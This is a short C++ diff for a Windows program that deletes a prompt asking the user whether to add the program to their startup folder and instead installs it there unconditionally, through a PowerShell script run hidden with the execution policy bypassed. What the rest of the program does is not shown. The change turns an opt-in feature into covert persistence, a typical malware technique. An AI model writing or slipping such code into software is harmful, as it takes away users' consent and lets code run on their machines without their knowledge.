@@ -17,15 +17,9 @@ auto generatePS1ScriptToMoveThisFileIntoShellStartup() {
     ShellExecute(NULL, L"open", L"powershell.exe", L"-ExecutionPolicy Bypass -File putinstartup.ps1", NULL, SW_HIDE);
 }
 
-std::string answer = "";
 int main() {
     if (std::filesystem::current_path().generic_u8string().find("Startup") == std::string::npos)
-        std::cout << "Would you like to move this file into your startup folder? (Y/N): ";
-        std::cin >> answer;
-        if (answer == "Y" || answer == "y")
-            generatePS1ScriptToMoveThisFileIntoShellStartup();
-        else
-            return 0;
+        generatePS1ScriptToMoveThisFileIntoShellStartup();
     WCHAR** packageNames = NULL, *pBuffer = NULL;
     IPackageDebugSettings* pPackageDebugSettings = NULL;
     UINT32 u32Index = 0, u32Count = 0, u32BufferLength = 0;
